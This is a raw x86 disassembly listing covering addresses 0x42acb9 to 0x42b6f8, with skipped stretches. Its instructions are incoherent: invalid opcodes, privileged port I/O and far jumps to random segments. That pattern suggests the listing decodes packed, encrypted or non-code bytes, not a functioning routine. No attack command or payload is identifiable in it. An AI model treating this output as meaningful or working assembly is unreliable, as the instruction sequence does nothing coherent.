  42acb9:	fstp   QWORD PTR ds:0x6539c7e3
  42acbf:	and    dl,dl
  42acc1:	icebp  
  42acc2:	call   0x753ce0c
  42acc7:	mov    ebx,0xdc4b90b0
  42accc:	cmp    al,0x3d
  42acce:	push   esi
  42accf:	out    dx,eax
  42acd0:	daa    
  42acd1:	in     eax,0x5f
  42acd3:	jmp    0x42ac62
  42acd5:	jl     0x42ad01
  42acd7:	xlat   BYTE PTR ds:[ebx]
  42acd8:	xor    DWORD PTR ds:0x3901ea71,eax
  42acde:	pop    ss
  42acdf:	xor    al,0x1d
  42ace1:	das    
  42ace2:	cmp    BYTE PTR [eax-0x7e63e504],cl
  42ace8:	daa    
  42ace9:	pop    ebp
  42acea:	js     0x42ad36
  42acec:	cmp    edi,DWORD PTR [edi+0x0]
	...
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	fwait
  42ad63:	clc    
  42ad64:	sub    dh,BYTE PTR [ebp+0x67]
  42ad67:	retf   
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	pop    edx
  42ad6f:	mov    ah,0x49
  42ad71:	test   eax,0xcf7449ef
  42ad76:	push   edi
  42ad77:	xchg   ecx,eax
  42ad78:	dec    edx
  42ad79:	pushf  
  42ad7a:	ret    0x4c40
  42ad7d:	dec    esi
  42ad7e:	bound  esi,QWORD PTR [ebx-0x12dc84b0]
  42ad84:	retf   
  42ad85:	pop    esi
  42ad86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad87:	sbb    BYTE PTR [eax],bl
  42ad89:	mov    dl,0x48
  42ad8b:	inc    edx
  42ad8c:	mov    BYTE PTR [edx],al
  42ad8e:	call   0x6790044b
  42ad93:	sbb    DWORD PTR [ecx+0x2f1b032],eax
  42ad99:	pop    edi
  42ad9a:	mov    DWORD PTR [esi-0x5b],eax
  42ad9d:	in     al,0x1a
  42ad9f:	sub    eax,0x7ba6a33d
  42ada4:	cmp    DWORD PTR [edx-0x2e],ecx
  42ada7:	jp     0x42ae03
  42ada9:	out    dx,eax
  42adaa:	test   al,0xa4
  42adac:	add    eax,0xe3ea1480
  42adb1:	enter  0x8d90,0x41
  42adb5:	loope  0x42ad54
  42adb7:	and    eax,0xb3765ccf
  42adbc:	inc    ebx
  42adbd:	mov    al,0x4
  42adbf:	adc    DWORD PTR [eax],ebx
  42adc1:	and    BYTE PTR [eax-0x7],0x13
  42adc5:	push   0x29
  42adc7:	sub    BYTE PTR [eax-0x9],dh
  42adca:	xchg   DWORD PTR ds:0x54978205,esp
  42add0:	test   BYTE PTR [ebx+0x1e83e355],0x91
  42add7:	jnp    0x42ae11
  42add9:	xor    al,0x16
  42addb:	es cwde 
  42addd:	(bad)
  42ade2:	arpl   bx,dx
  42ade4:	push   0x68
  42ade6:	fidivr DWORD PTR [ebx]
  42ade8:	leave  
  42ade9:	fld    TBYTE PTR [edi-0x28]
  42adec:	jmp    0x6779:0xe25f9df
  42adf3:	and    DWORD PTR [esi+0x15f24f98],ecx
  42adf9:	xchg   si,ax
  42adfb:	es sbb al,0x92
  42adfe:	add    DWORD PTR [ecx+0x3b],0x21297d7d
  42ae05:	dec    ebx
  42ae06:	sub    BYTE PTR [ecx],bh
  42ae08:	push   0x17
  42ae0a:	shr    DWORD PTR [ecx],0xba
  42ae0d:	pusha  
  42ae0e:	cwde   
  42ae0f:	push   0x3a04056f
  42ae14:	and    cl,ah
  42ae16:	sub    eax,0x1dda750f
  42ae1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae1c:	test   DWORD PTR [ebp+ebx*8+0x54c67585],edx
  42ae23:	lds    eax,FWORD PTR [ecx]
  42ae25:	retf   
  42ae26:	add    al,0x1e
  42ae28:	outs   dx,DWORD PTR ds:[esi]
  42ae29:	(bad)  
  42ae2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae2b:	add    eax,DWORD PTR [ebp-0x339bc498]
  42ae31:	stc    
  42ae32:	ins    DWORD PTR es:[edi],dx
  42ae33:	and    dh,BYTE PTR [esp+ebx*1]
  42ae36:	in     al,dx
  42ae37:	sub    bh,BYTE PTR [esi-0x29b219e6]
  42ae3d:	xchg   esp,eax
  42ae3e:	into   
  42ae3f:	push   ebp
  42ae40:	bound  esp,QWORD PTR [ebx-0x559f61fa]
  42ae46:	push   cs
  42ae47:	xchg   ebp,eax
  42ae48:	sub    al,0xab
  42ae4a:	iret   
  42ae4b:	add    al,0x10
  42ae4d:	mov    al,0xd9
  42ae4f:	arpl   ax,si
  42ae51:	retf   0x396a
  42ae54:	mov    ch,0x80
  42ae56:	(bad)  [esi-0x1c]
  42ae59:	jb     0x42ae50
  42ae5b:	push   eax
  42ae5c:	or     BYTE PTR gs:[eax+edi*4+0x1c3fabe],dl
  42ae64:	lods   al,BYTE PTR ds:[esi]
  42ae65:	ins    DWORD PTR es:[edi],dx
  42ae66:	(bad)  
  42ae68:	sbb    bl,BYTE PTR [ebp-0xa]
  42ae6b:	jns    0x42ae02
  42ae6d:	inc    esi
	...
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	imul   ecx,DWORD PTR [ebp-0x33986de1],0x1
  42aee9:	add    BYTE PTR [eax],al
  42aeeb:	add    DWORD PTR [eax],eax
  42aeed:	add    dl,cl
  42aeef:	and    ah,BYTE PTR [eax-0x602ed5c6]
  42aef5:	xchg   ebp,eax
  42aef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aef7:	jmp    0x4169:0x2c8dd1f8
  42aefe:	ja     0x42aef6
  42af00:	aaa    
  42af01:	pusha  
  42af02:	pop    edx
  42af03:	adc    DWORD PTR ds:0x29b9ce57,ebx
  42af09:	in     al,0xe4
  42af0b:	cs retf 
  42af0d:	push   ebp
  42af0e:	sbb    dh,al
  42af10:	mov    al,ds:0x71613456
  42af15:	test   al,0xf9
  42af17:	leave  
  42af18:	push   ebx
  42af19:	pop    ds
  42af1a:	sbb    DWORD PTR [eax+0x443e3707],ebp
  42af20:	je     0x42af8f
  42af22:	mov    edx,0x815717dc
  42af27:	cmp    dl,dl
  42af29:	rol    BYTE PTR [ecx-0x43],0xdb
  42af2d:	sahf   
  42af2e:	pushf  
  42af2f:	lea    eax,[ebx+0x59]
  42af32:	sub    DWORD PTR [ebx+0x5a],ecx
  42af35:	mov    ebp,0xc7a1fe7d
  42af3a:	imul   ebp
  42af3c:	and    DWORD PTR [edi],0x532bc40d
  42af42:	adc    eax,0x39cd2d2e
  42af47:	or     esp,edi
  42af49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af4a:	adc    al,0x90
  42af4c:	pop    es
  42af4d:	shl    BYTE PTR [esi+0xb],cl
  42af50:	out    0x83,al
  42af52:	call   0xd95a:0x4913416e
  42af59:	mov    al,ds:0xb3f329ed
  42af5e:	jne    0x42af30
  42af60:	jle    0x42afa1
  42af62:	cmovne edx,DWORD PTR [ecx]
  42af65:	sti    
  42af66:	sub    eax,0x6d5b1f73
  42af6b:	push   es
  42af6c:	bound  eax,QWORD PTR [esi+0xf89ea1d]
  42af72:	jns    0x42af9d
  42af74:	pop    esi
  42af75:	mov    al,0x76
  42af77:	lods   eax,DWORD PTR ds:[esi]
  42af78:	cs inc ebx
  42af7a:	sub    eax,0x6cbc6ffb
  42af7f:	rep ins DWORD PTR es:[edi],dx
  42af81:	xor    al,0x1c
  42af83:	xchg   esi,eax
  42af84:	jle    0x42af3d
  42af86:	mov    ds:0xe0edb402,al
  42af8b:	cmp    eax,0x5fb48e0c
  42af90:	aam    0x9d
  42af92:	adc    eax,0x59eb7e09
  42af97:	adc    dl,BYTE PTR [esi]
  42af99:	aaa    
  42af9a:	(bad)  
  42af9b:	fsub   st(6),st
  42af9d:	in     eax,0xf2
  42af9f:	mov    ebx,0xf6fe6855
  42afa4:	retf   
  42afa5:	dec    esi
  42afa6:	test   al,0x44
  42afa8:	inc    edx
  42afa9:	in     al,dx
  42afaa:	push   ecx
  42afab:	xchg   edi,eax
  42afac:	mov    ebx,0x26191082
  42afb1:	sti    
  42afb2:	stos   BYTE PTR es:[edi],al
  42afb3:	scas   eax,DWORD PTR es:[edi]
  42afb4:	jge    0x42afe6
  42afb6:	shl    BYTE PTR [edi+0x221cc9c2],1
  42afbc:	mov    ebx,0xc8141851
  42afc1:	xchg   ecx,eax
  42afc2:	xchg   esp,eax
  42afc3:	rcl    DWORD PTR [esi+0x16],cl
  42afc6:	shl    BYTE PTR [edi],0x9
  42afc9:	adc    DWORD PTR [ecx+eax*1+0x2d22a759],0xd58593aa
  42afd4:	hlt    
  42afd5:	jae    0x42b031
  42afd7:	pushf  
  42afd8:	(bad)  
  42afd9:	loope  0x42b006
  42afdb:	fadd   DWORD PTR [ecx-0x701e1565]
  42afe1:	sub    DWORD PTR [ebx+eax*1-0x5f],esi
  42afe5:	shl    BYTE PTR [edx],cl
  42afe7:	push   esi
  42afe8:	ins    DWORD PTR es:[edi],dx
  42afe9:	dec    edi
  42afea:	in     al,dx
  42afeb:	pop    ss
  42afec:	jno    0x42afb6
	...
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	push   0xffffffeb
  42b064:	jae    0x42b067
  42b066:	addr16 int 0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [eax-0x71],bh
  42b070:	das    
  42b071:	xor    BYTE PTR [eax+0x52],bl
  42b074:	(bad)  
  42b075:	aam    0x10
  42b077:	stc    
  42b078:	inc    edx
  42b079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b07a:	mov    cl,0x59
  42b07c:	jb     0x42b02d
  42b07e:	das    
  42b07f:	das    
  42b080:	dec    ecx
  42b081:	ja     0x42b075
  42b083:	fsub   QWORD PTR [ecx-0x5d]
  42b086:	dec    ebx
  42b087:	cmp    eax,0x9e1b19ba
  42b08c:	push   ds
  42b08d:	aas    
  42b08e:	ss push cs
  42b090:	pop    es
  42b091:	dec    ecx
  42b092:	fadd   st(5),st
  42b094:	fisttp DWORD PTR [edi+0x5dcb53cc]
  42b09a:	add    edx,esi
  42b09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b09d:	sbb    esi,DWORD PTR ds:0x86de21be
  42b0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0a4:	push   edx
  42b0a5:	das    
  42b0a6:	dec    ebx
  42b0a7:	(bad)  
  42b0a8:	test   BYTE PTR ds:[ebx+0x1bf02119],0x30
  42b0b0:	xchg   BYTE PTR [ecx+0x4935c61c],ah
  42b0b6:	jns    0x42b12a
  42b0b8:	sub    DWORD PTR [ebx+0x73],ebx
  42b0bb:	nop
  42b0bc:	hlt    
  42b0bd:	addr16 inc esp
  42b0bf:	jb     0x42b074
  42b0c1:	jp     0x42b08b
  42b0c3:	pushf  
  42b0c4:	sub    DWORD PTR ds:0x7c160457,ecx
  42b0ca:	out    dx,al
  42b0cb:	push   edi
  42b0cc:	retf   0x7795
  42b0cf:	shl    BYTE PTR [ecx+0x5],cl
  42b0d2:	repnz push es
  42b0d4:	(bad)  
  42b0d6:	xor    edx,ecx
  42b0d8:	or     BYTE PTR [ebx],bh
  42b0da:	xor    esi,DWORD PTR [ebx+eiz*4+0x44eaaeb]
  42b0e1:	or     WORD PTR [edx],dx
  42b0e4:	xchg   esi,eax
  42b0e5:	mov    edi,0x8de01a6c
  42b0ea:	jne    0x42b165
  42b0ec:	sbb    bl,cl
  42b0ee:	mov    eax,0xdc4dc4a9
  42b0f3:	pushf  
  42b0f4:	adc    al,bh
  42b0f6:	mov    esi,0xe3d6046e
  42b0fb:	call   0xd13b:0xb7799da7
  42b102:	add    ebx,ebp
  42b104:	lds    esp,FWORD PTR [ecx+0x48b57a5]
  42b10a:	sub    cl,BYTE PTR [edx]
  42b10c:	mov    bh,0xf3
  42b10e:	mov    cl,dl
  42b110:	mov    fs,esp
  42b112:	mov    WORD PTR [esi],cs
  42b114:	jnp    0x42b142
  42b116:	adc    eax,0xa3443ae5
  42b11b:	les    ecx,FWORD PTR fs:[ebx-0x7cb1733a]
  42b122:	shl    BYTE PTR [ecx],cl
  42b124:	adc    DWORD PTR [esi+0x4e983f9a],esi
  42b12a:	addr16 pushf 
  42b12c:	lds    ebx,FWORD PTR [esp+ebp*4-0x27]
  42b130:	or     eax,edi
  42b132:	or     eax,0x79be7000
  42b137:	rcr    BYTE PTR [ebx+ebp*1-0x3b],cl
  42b13b:	stos   BYTE PTR es:[edi],al
  42b13c:	icebp  
  42b13d:	fidivr WORD PTR [ecx]
  42b13f:	ret    0x454d
  42b142:	add    ebx,DWORD PTR [ebx+0x49f45843]
  42b148:	dec    esi
  42b149:	outs   dx,DWORD PTR ds:[esi]
  42b14a:	mov    ah,BYTE PTR [eax+edi*8+0xa0d9244]
  42b151:	pop    ebx
  42b152:	or     DWORD PTR [edi],ebp
  42b154:	lock call 0xbf1b525
  42b15a:	(bad)  
  42b15b:	mov    ds:0xe545ad6a,al
  42b160:	xchg   BYTE PTR [ebx-0x208642ce],al
  42b166:	test   BYTE PTR [edx],ah
  42b168:	adc    al,0x12
  42b16a:	fcomp  DWORD PTR [ecx]
  42b16c:	dec    DWORD PTR [ecx]
	...
  42b1d6:	jne    0x42b1fd
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	adc    ch,ch
  42b1e4:	mov    edi,0x1ce673e
  42b1e9:	add    BYTE PTR [eax],al
  42b1eb:	add    DWORD PTR [eax],eax
  42b1ed:	add    BYTE PTR [ebx+esi*4],bl
  42b1f0:	shl    DWORD PTR [esi+0x2ea7b648],0xec
  42b1f7:	icebp  
  42b1f8:	ret    0xb3db
  42b1fb:	ss jge 0x42b249
  42b1fe:	jae    0x42b1e0
  42b200:	out    0x51,al
  42b202:	xchg   esi,eax
  42b203:	frstor [ebx-0x4e]
  42b206:	inc    esp
  42b207:	cld    
  42b208:	pop    esi
  42b209:	les    ebp,FWORD PTR [esi-0x2f152802]
  42b20f:	add    ebx,esp
  42b211:	xchg   ebx,eax
  42b212:	mov    bl,0xd2
  42b214:	jge    0x42b28c
  42b216:	jle    0x42b1b1
  42b218:	(bad)
  42b21b:	lock (bad) 
  42b21d:	and    al,0x74
  42b21f:	inc    eax
  42b220:	hlt    
  42b221:	lods   al,BYTE PTR ds:[esi]
  42b222:	dec    ecx
  42b223:	addr16 jbe 0x42b297
  42b226:	enter  0xb4b7,0x44
  42b22a:	aaa    
  42b22b:	jae    0x42b25c
  42b22d:	xchg   esi,eax
  42b22e:	ror    eax,1
  42b230:	jge    0x42b1bd
  42b232:	adc    BYTE PTR [eax+ebx*4-0x1e],al
  42b236:	retf   
  42b237:	adc    eax,DWORD PTR ds:0xabadd5df
  42b23d:	dec    ebp
  42b23e:	neg    BYTE PTR [esi]
  42b240:	mov    bh,bh
  42b242:	dec    edx
  42b243:	dec    eax
  42b244:	xor    ecx,DWORD PTR [eax+0x3a970dc6]
  42b24a:	ins    DWORD PTR es:[edi],dx
  42b24b:	aad    0xe2
  42b24d:	into   
  42b24e:	clc    
  42b24f:	lods   al,BYTE PTR ds:[esi]
  42b250:	mov    ecx,ecx
  42b252:	jecxz  0x42b2a9
  42b254:	jae    0x42b280
  42b256:	stos   DWORD PTR es:[edi],eax
  42b257:	mov    al,0x73
  42b259:	push   edi
  42b25a:	push   ebp
  42b25b:	mov    ecx,0xc541fb41
  42b260:	stos   BYTE PTR es:[edi],al
  42b261:	lea    esp,[edx-0x2273cfe2]
  42b267:	addr16 enter 0x948d,0xb3
  42b26c:	and    BYTE PTR [ecx],0x9
  42b26f:	mov    ebp,0x9511008a
  42b274:	bound  esp,QWORD PTR [edi+esi*1+0x58]
  42b278:	loopne 0x42b2d2
  42b27a:	mov    esp,DWORD PTR [esi-0x4ecb2fec]
  42b280:	inc    ebp
  42b281:	ror    BYTE PTR ds:0x2946a207,0x81
  42b288:	dec    ebp
  42b289:	pusha  
  42b28a:	add    eax,0xb19482f1
  42b28f:	or     al,0x3b
  42b291:	push   edi
  42b292:	sbb    ah,ch
  42b294:	(bad)
  42b297:	inc    ebx
  42b298:	dec    esi
  42b299:	ss ret 0x8448
  42b29d:	test   DWORD PTR [esi],0x1af79416
  42b2a3:	add    eax,esp
  42b2a5:	mov    eax,ds:0xbc66eb5e
  42b2aa:	fwait
  42b2ab:	sbb    cl,bl
  42b2ad:	mov    ah,0xdd
  42b2af:	push   eax
  42b2b0:	(bad)  
  42b2b1:	mov    edi,0xa55bc14e
  42b2b6:	loope  0x42b23f
  42b2b8:	or     edi,DWORD PTR [ebx]
  42b2ba:	jl     0x42b282
  42b2bc:	fst    DWORD PTR [edi-0x1c]
  42b2bf:	stos   DWORD PTR es:[edi],eax
  42b2c0:	dec    edi
  42b2c1:	sub    eax,0x25705d00
  42b2c6:	dec    edi
  42b2c7:	dec    ebp
  42b2c8:	hlt    
  42b2c9:	call   0x78c138f0
  42b2ce:	sti    
  42b2cf:	ins    BYTE PTR es:[edi],dx
  42b2d0:	cmp    edx,edi
  42b2d2:	out    0xa4,al
  42b2d4:	push   edx
  42b2d5:	call   0x512ae17c
  42b2da:	or     edi,0xfffffff7
  42b2dd:	mov    bh,0x4e
  42b2df:	lds    ecx,FWORD PTR [eax]
  42b2e1:	mov    DWORD PTR [ebp-0x60d137d0],0xdf3f8cc3
  42b2eb:	pop    es
  42b2ec:	repnz lods al,BYTE PTR ds:[esi]
	...
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0x9c738e65
  42b363:	and    BYTE PTR [esi],ah
  42b365:	dec    ecx
  42b366:	addr16 iret 
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	pushf  
  42b36f:	xor    DWORD PTR [esi],eax
  42b371:	cmp    esp,eax
  42b373:	mov    al,ds:0x86d88270
  42b378:	arpl   WORD PTR [edx+edi*1-0xc],cx
  42b37c:	in     al,dx
  42b37d:	pop    esp
  42b37e:	dec    edx
  42b37f:	add    eax,0x81208790
  42b384:	xlat   BYTE PTR ds:[ebx]
  42b385:	dec    ebp
  42b386:	mov    ebp,0xcac2fc8e
  42b38b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b38c:	call   0xf5ab:0x2592426b
  42b393:	jmp    DWORD PTR [ecx+0x20]
  42b396:	arpl   WORD PTR [ebx+0x69],dx
  42b399:	sub    dh,dl
  42b39b:	in     al,dx
  42b39c:	push   ebp
  42b39d:	in     eax,0x17
  42b39f:	mov    eax,ds:0xfe400058
  42b3a4:	dec    edx
  42b3a5:	or     BYTE PTR [ebp+0x6b],al
  42b3a8:	aad    0x4e
  42b3aa:	lds    edx,FWORD PTR [edi-0x44]
  42b3ad:	mov    dh,0xc6
  42b3af:	cli    
  42b3b0:	and    DWORD PTR [ebx+0x18],ebp
  42b3b3:	mov    dh,BYTE PTR [ebx+ebp*8+0x51]
  42b3b7:	mov    al,ds:0x7f391f00
  42b3bc:	js     0x42b419
  42b3be:	cmp    BYTE PTR [ecx-0x6e],ch
  42b3c1:	pop    es
  42b3c2:	push   ecx
  42b3c3:	scas   al,BYTE PTR es:[edi]
  42b3c4:	fisttp QWORD PTR [eax+0x29]
  42b3c7:	dec    ebx
  42b3c8:	add    eax,0x7fcd1e26
  42b3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3ce:	add    BYTE PTR [ecx-0x33],ch
  42b3d1:	bound  edx,QWORD PTR [ecx]
  42b3d3:	and    DWORD PTR [ebx-0x18],eax
  42b3d6:	pop    edx
  42b3d7:	inc    eax
  42b3d8:	adc    eax,0xf5e0464d
  42b3dd:	test   al,0x75
  42b3df:	sub    BYTE PTR [eax+edi*1],bl
  42b3e2:	xchg   esi,eax
  42b3e3:	sti    
  42b3e4:	stc    
  42b3e5:	jnp    0x42b39b
  42b3e7:	test   BYTE PTR ss:[ecx-0x721c43e0],al
  42b3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3ef:	(bad)  
  42b3f0:	cmp    ebx,DWORD PTR [ebx]
  42b3f2:	add    bh,BYTE PTR [esi+ebx*8]
  42b3f5:	cmp    eax,esp
  42b3f7:	add    BYTE PTR [edi-0x2d],ah
  42b3fa:	neg    BYTE PTR [ebp+eax*1-0x6f]
  42b3fe:	into   
  42b3ff:	or     DWORD PTR [ecx],ecx
  42b401:	xor    eax,0x4b005b64
  42b406:	cmp    DWORD PTR [esi+0x71],edx
  42b409:	push   ds
  42b40a:	push   ss
  42b40b:	ins    BYTE PTR es:[edi],dx
  42b40c:	shrd   DWORD PTR [edx+0x19],esi,0xc5
  42b411:	lds    ebp,FWORD PTR [ecx+0x5c]
  42b414:	cmp    eax,0xaab89d95
  42b419:	mov    esi,0x96a75158
  42b41e:	inc    esp
  42b41f:	jae    0x42b45d
  42b421:	lods   eax,DWORD PTR ds:[esi]
  42b422:	mov    dl,0x3
  42b424:	je     0x42b40f
  42b426:	mov    edi,0xdaec5812
  42b42b:	out    0xf9,eax
  42b42d:	(bad)  
  42b42e:	js     0x42b422
  42b430:	cdq    
  42b431:	stos   DWORD PTR es:[edi],eax
  42b432:	push   ecx
  42b433:	jmp    0x4194:0x38b39e4
  42b43a:	aam    0x7d
  42b43c:	sahf   
  42b43d:	mov    cl,0x39
  42b43f:	mov    ebx,0xe296577d
  42b444:	nop
  42b445:	mov    edx,0x7ee36f61
  42b44a:	push   ebp
  42b44b:	ret    
  42b44c:	fbld   TBYTE PTR gs:[edx-0x66]
  42b450:	or     ebx,esi
  42b452:	pop    es
  42b453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b454:	xchg   ebx,eax
  42b455:	iret   
  42b456:	mov    BYTE PTR ds:0x795741f9,0x31
  42b45d:	pop    ds
  42b45e:	scas   al,BYTE PTR es:[edi]
  42b45f:	mov    ds:0xc80b15de,eax
  42b464:	push   esp
  42b465:	(bad)  [edi]
  42b467:	mov    esi,0xf6e7819d
  42b46c:	(bad)  
  42b46d:	pusha  
	...
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   ebp,ecx
  42b4e3:	or     al,0x7a
  42b4e5:	dec    ecx
  42b4e6:	rol    BYTE PTR [bx+di],1
  42b4e9:	add    BYTE PTR [eax],al
  42b4eb:	add    DWORD PTR [eax],eax
  42b4ed:	add    BYTE PTR [ebx+ecx*4],ah
  42b4f0:	push   cs
  42b4f1:	and    BYTE PTR [esi],bl
  42b4f3:	sub    ebx,edx
  42b4f5:	push   ebp
  42b4f6:	adc    eax,0x154f0075
  42b4fb:	aam    0xc1
  42b4fd:	js     0x42b4ea
  42b4ff:	or     BYTE PTR ds:0x2516063f,ah
  42b505:	xor    edx,DWORD PTR [edi-0xb255e57]
  42b50b:	into   
  42b50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b50d:	outs   dx,DWORD PTR ds:[esi]
  42b50e:	pop    ecx
  42b50f:	sub    eax,0x3ee49063
  42b514:	ldmxcsr DWORD PTR ds:0x56689738
  42b51b:	in     al,0xc5
  42b51d:	adc    eax,0x370a4779
  42b522:	shl    DWORD PTR cs:[ecx],cl
  42b525:	sbb    bl,BYTE PTR [esi]
  42b527:	jecxz  0x42b55d
  42b529:	xchg   ecx,eax
  42b52a:	int    0xd7
  42b52c:	gs lock aaa 
  42b52f:	cmp    esi,esp
  42b531:	imul   ebp,DWORD PTR [edi-0x31c9b979],0x3f080983
  42b53b:	inc    ebx
  42b53c:	mov    ebx,0xa991ee65
  42b541:	add    ah,bl
  42b543:	fstp   TBYTE PTR [edx-0x50af7eed]
  42b549:	inc    esp
  42b54a:	mov    bl,0x9d
  42b54c:	jp     0x42b4f3
  42b54e:	outs   dx,BYTE PTR ds:[esi]
  42b54f:	mov    ebp,0x2934b449
  42b554:	pop    ebx
  42b555:	pushf  
  42b556:	jbe    0x42b5b2
  42b558:	or     eax,0xc625b71a
  42b55d:	dec    esi
  42b55e:	arpl   bx,sp
  42b560:	sbb    eax,0x579ab9c
  42b565:	pop    edx
  42b566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b567:	sub    DWORD PTR [ecx+0x38],ebp
  42b56a:	out    0x76,al
  42b56c:	mov    bh,0x61
  42b56e:	dec    eax
  42b56f:	adc    DWORD PTR [ebx+ecx*2+0x7e],ebx
  42b573:	xchg   ecx,eax
  42b574:	inc    edi
  42b575:	and    eax,0xf6d7522f
  42b57a:	mov    dh,0x60
  42b57c:	fsubr  st(0),st
  42b57e:	xchg   DWORD PTR [eax+0x286bf8b8],ebp
  42b584:	mov    eax,0xb0bcbe1
  42b589:	or     BYTE PTR [ecx-0x397dd9ec],al
  42b58f:	aam    0x29
  42b591:	mov    dh,0xab
  42b593:	lea    esp,[ebx]
  42b595:	mov    ecx,DWORD PTR [ecx-0x38]
  42b598:	in     al,dx
  42b599:	cli    
  42b59a:	int3   
  42b59b:	xchg   ebx,eax
  42b59c:	and    eax,0x64f90eab
  42b5a1:	test   DWORD PTR [edi],0x732ef63f
  42b5a7:	pop    esi
  42b5a8:	add    ebx,edi
  42b5aa:	mov    WORD PTR [ebx-0x454b332d],es
  42b5b0:	mov    al,0xb0
  42b5b2:	(bad)  
  42b5b3:	pop    ebx
  42b5b4:	inc    edi
  42b5b5:	call   0x7268cd04
  42b5ba:	nop
  42b5bb:	int3   
  42b5bc:	hlt    
  42b5bd:	pop    esp
  42b5be:	mov    ebx,0x92695340
  42b5c3:	into   
  42b5c4:	add    edi,DWORD PTR [ecx+0x4672e19b]
  42b5ca:	or     edx,DWORD PTR [ebx-0x14]
  42b5cd:	push   cs
  42b5ce:	hlt    
  42b5cf:	and    ch,BYTE PTR [ebx]
  42b5d1:	sub    edx,DWORD PTR [edi+0x64af24f6]
  42b5d7:	jmp    0xfb6:0xe01d32b
  42b5de:	dec    edi
  42b5df:	xchg   ebx,eax
  42b5e0:	ins    BYTE PTR es:[edi],dx
  42b5e1:	out    0x65,al
  42b5e3:	psubsw mm5,QWORD PTR [ebx+0x1875b42]
  42b5ea:	sub    ah,BYTE PTR [ebx+ebx*2-0x41]
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	pushf  
  42b663:	inc    ecx
  42b664:	mov    ds:0x1d1677c,al
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [ebx],bh
  42b66f:	rcl    esp,1
  42b671:	xor    DWORD PTR [edi+0x667cb954],ecx
  42b677:	les    edx,FWORD PTR [edx]
  42b679:	pushf  
  42b67a:	xchg   ebx,eax
  42b67b:	retf   0x20df
  42b67e:	sbb    ah,bl
  42b680:	int    0x54
  42b682:	mov    DWORD PTR [eax-0x47],esp
  42b685:	rol    ch,1
  42b687:	les    edi,FWORD PTR [edx+0x1b]
  42b68a:	jbe    0x42b645
  42b68c:	pop    esi
  42b68d:	dec    ebx
  42b68e:	pushf  
  42b68f:	add    ah,BYTE PTR [esi+ebx*2+0x19]
  42b693:	pop    edx
  42b694:	sub    BYTE PTR [ecx+0x5c],dl
  42b697:	and    al,0x78
  42b699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b69a:	xchg   ecx,eax
  42b69b:	xchg   DWORD PTR [ebx+0x18ffa95e],edi
  42b6a1:	jne    0x42b6b9
  42b6a3:	aaa    
  42b6a4:	(bad)  
  42b6a5:	dec    ebp
  42b6a6:	xchg   edx,eax
  42b6a7:	aam    0xad
  42b6a9:	sbb    DWORD PTR [eax+0x190b797b],edi
  42b6af:	add    ch,dh
  42b6b1:	or     edx,DWORD PTR [eax-0x4bb66a6d]
  42b6b7:	mov    ebp,0x2f7e99e0
  42b6bc:	mov    ebp,0xb70a912d
  42b6c1:	(bad)  
  42b6c2:	mov    BYTE PTR [eax+0x40be5593],dh
  42b6c8:	dec    ecx
  42b6c9:	add    bh,BYTE PTR [ebp+0x22]
  42b6cc:	loop   0x42b688
  42b6ce:	fbld   TBYTE PTR [edi]
  42b6d0:	xlat   BYTE PTR ds:[ebx]
  42b6d1:	js     0x42b6bd
  42b6d3:	(bad)  
  42b6d4:	adc    DWORD PTR [edi],edi
  42b6d6:	fadd   st,st(5)
  42b6d8:	xchg   ecx,eax
  42b6d9:	out    0x85,al
  42b6db:	push   ebx
  42b6dc:	mov    bh,0xd3
  42b6de:	push   0xf34cf11c
  42b6e3:	inc    esp
  42b6e4:	mov    edi,0x7b6f0a5c
  42b6e9:	push   0xffffff9a
  42b6eb:	or     DWORD PTR [eax-0x6bb76e17],ebx
  42b6f1:	out    dx,al
  42b6f2:	int3   
  42b6f3:	mov    eax,0x8eee7b06
  42b6f8:	inc    edi
